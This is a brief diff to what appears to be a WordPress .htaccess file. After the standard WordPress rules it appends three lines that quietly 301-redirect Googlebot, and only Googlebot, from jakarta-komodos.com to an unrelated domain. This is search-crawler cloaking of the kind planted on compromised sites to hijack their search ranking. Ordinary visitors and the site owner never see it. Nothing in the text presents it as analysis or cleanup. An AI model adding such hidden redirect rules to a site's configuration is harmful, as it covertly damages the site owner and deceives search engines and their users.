@@ -9,3 +9,7 @@ RewriteCond %{REQUEST\_FILENAME} !-d
 RewriteRule . /index.php \[L\]
 
 # END WordPress
+
+RewriteCond %{HTTP_HOST} jakarta-komodos\.com$ [NC]
+RewriteCond %{HTTP_USER_AGENT} Googlebot 
+RewriteRule ^ http://christianscripttees.com [L,R=301]
